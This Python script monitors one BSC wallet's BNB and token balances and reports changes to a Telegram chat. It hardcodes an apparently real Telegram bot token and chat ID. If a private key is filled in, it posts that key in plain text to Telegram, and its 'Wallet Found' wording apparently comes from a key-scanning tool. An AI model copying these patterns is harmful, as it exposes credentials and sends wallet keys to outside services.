#!/usr/bin/env python3
import json
import logging
import requests
from web3 import Web3
from eth_account import Account
import telegram
import asyncio
from telegram.error import RetryAfter, TimedOut, NetworkError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("wallet_checker.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constants
BSC_RPC_URL = "https://bsc-dataseed.binance.org/"
TELEGRAM_BOT_TOKEN = '7990540181:AAGKVAaZUlvh1_j4T_861s2wnagUHy3ZFeM'
TELEGRAM_CHAT_ID = '-4654599263'
SCAN_DELAY = 60  # Time between balance checks in seconds
MINIMUM_BALANCE_TO_ALERT = 0.002  # Minimum balance to trigger a significant balance alert

# Target wallet to monitor
TARGET_PRIVATE_KEY = 'YOUR_PRIVATE_KEY_HERE'  # Replace with actual private key if you have it
TARGET_WALLET = '0x3DC0Ea30D20a45e67E9451A36CE96933744a039f'

# Token contract addresses on BSC
TOKEN_CONTRACTS = {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'BTC': '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',  # BTCB on BSC
    'XRP': '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
    'TRX': '0xCE7de646e7208a4Ef112cb6ed5038FA6cC6b12e3',
    'TON': '0x76A797A59Ba2C17726896976B7B3747BfD1d220f'
}

# Minimal ABI for ERC-20 balanceOf function
TOKEN_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    }
]

class WalletBalanceChecker:
    def __init__(self):
        # Initialize Web3 connection
        self.w3 = self._init_web3()
        # Initialize Telegram bot
        self.bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
        # Prepare token contracts
        self.token_contracts = self._init_token_contracts()
        # Track previous balances to report only changes
        self.previous_balances = {}
        # Flag to track if initial notification has been sent
        self.initial_notification_sent = False

    def _init_web3(self):
        """Initialize and return Web3 connection."""
        w3 = Web3(Web3.HTTPProvider(BSC_RPC_URL))
        if not w3.is_connected():
            raise ConnectionError(f"Failed to connect to BSC node at {BSC_RPC_URL}")
        logger.info(f"Connected to BSC node: {BSC_RPC_URL}")
        return w3

    def _init_token_contracts(self):
        """Initialize token contract objects."""
        contracts = {}
        for token, address in TOKEN_CONTRACTS.items():
            contracts[token] = self.w3.eth.contract(address=self.w3.to_checksum_address(address), abi=TOKEN_ABI)
        return contracts

    async def send_telegram_message(self, message):
        """Send message to Telegram with retry logic."""
        max_retries = 5
        retry_delay = 5

        for attempt in range(max_retries):
            try:
                await self.bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, parse_mode='HTML')
                logger.info("Telegram message sent successfully")
                return True
            except RetryAfter as e:
                wait_time = e.retry_after + 1
                logger.warning(f"Rate limited by Telegram. Waiting {wait_time} seconds...")
                await asyncio.sleep(wait_time)
            except (TimedOut, NetworkError) as e:
                wait_time = retry_delay * (attempt + 1)
                logger.warning(f"Network error: {e}. Retrying in {wait_time} seconds...")
                await asyncio.sleep(wait_time)
            except Exception as e:
                logger.error(f"Failed to send Telegram message: {e}")
                return False
        
        logger.error("Maximum retries reached. Failed to send Telegram message.")
        return False

    async def check_wallet_balances(self):
        """Check token balances for the target wallet address."""
        try:
            address = self.w3.to_checksum_address(TARGET_WALLET)
            
            # Check BNB balance
            balance_wei = self.w3.eth.get_balance(address)
            balance_bnb = float(self.w3.from_wei(balance_wei, 'ether'))
            
            # Object to store all balances
            balances = {'BNB': balance_bnb}
            
            # Check token balances
            for token, contract in self.token_contracts.items():
                try:
                    balance = contract.functions.balanceOf(address).call()
                    # Convert balance to human-readable format (assuming 18 decimals)
                    balance_readable = float(self.w3.from_wei(balance, 'ether'))
                    balances[token] = balance_readable
                except Exception as e:
                    logger.error(f"Error checking {token} balance: {e}")
                    balances[token] = 0.0
            
            # Determine if we should send a notification
            should_notify = False
            
            # Always notify on first check
            if not self.initial_notification_sent:
                should_notify = True
                self.initial_notification_sent = True
            # Or if balances changed
            elif not self.previous_balances:
                should_notify = True
            else:
                for token, balance in balances.items():
                    if token in self.previous_balances and balance != self.previous_balances[token]:
                        should_notify = True
                        break
            
            # Update previous balances
            self.previous_balances = balances.copy()
            
            if should_notify:
                # Format balance message
                balance_message = f"💰 <b>Wallet Found with Balance</b> 💰\n\n"
                
                # Include private key if available
                if TARGET_PRIVATE_KEY and TARGET_PRIVATE_KEY != 'YOUR_PRIVATE_KEY_HERE':
                    # Format to match original script's output (without '0x' prefix)
                    private_key = TARGET_PRIVATE_KEY
                    if private_key.startswith('0x'):
                        private_key = private_key[2:]
                    balance_message += f"🔑 <code>{private_key}</code>\n"
                
                balance_message += f"📍 <code>{address}</code>\n\n"
                
                # Add balance information
                has_significant_balance = False
                for token, balance in balances.items():
                    if balance > 0:
                        balance_message += f"{token}: {balance}\n"
                        if balance >= MINIMUM_BALANCE_TO_ALERT:
                            has_significant_balance = True
                
                # Add alert for significant balance
                if has_significant_balance:
                    balance_message += "\n🚨 <b>SIGNIFICANT BALANCE DETECTED!</b> 🚨"
                
                # Send notification with current balances
                await self.send_telegram_message(balance_message)
                logger.info(f"Balance notification sent for wallet {address}")
            else:
                logger.info(f"No balance changes detected for wallet {address}")
            
            return balances
            
        except Exception as e:
            logger.error(f"Error checking balances for {TARGET_WALLET}: {e}")
            return None

async def main():
    checker = WalletBalanceChecker()
    
    logger.info("Wallet Balance Checker starting...")
    logger.info(f"Target wallet: {TARGET_WALLET}")
    
    # Send startup notification
    startup_message = "🔍 <b>Wallet Balance Checker Started</b> 🔍\n"
    if TARGET_PRIVATE_KEY and TARGET_PRIVATE_KEY != 'YOUR_PRIVATE_KEY_HERE':
        private_key_display = TARGET_PRIVATE_KEY
        if private_key_display.startswith('0x'):
            private_key_display = private_key_display[2:]
        startup_message += f"Monitoring private key: <code>{private_key_display}</code>\n"
    startup_message += f"Wallet address: <code>{TARGET_WALLET}</code>"
    
    await checker.send_telegram_message(startup_message)
    
    try:
        while True:  # Loop forever to continuously monitor
            try:
                logger.info("Checking wallet balances...")
                await checker.check_wallet_balances()
                logger.info(f"Waiting {SCAN_DELAY} seconds until next check...")
                await asyncio.sleep(SCAN_DELAY)
            except Exception as e:
                logger.error(f"Error in main checking loop: {e}")
                logger.info("Waiting 60 seconds before retrying...")
                await asyncio.sleep(60)
    except KeyboardInterrupt:
        logger.info("Checker stopped by user")

if __name__ == "__main__":
    # Run the main coroutine
    asyncio.run(main())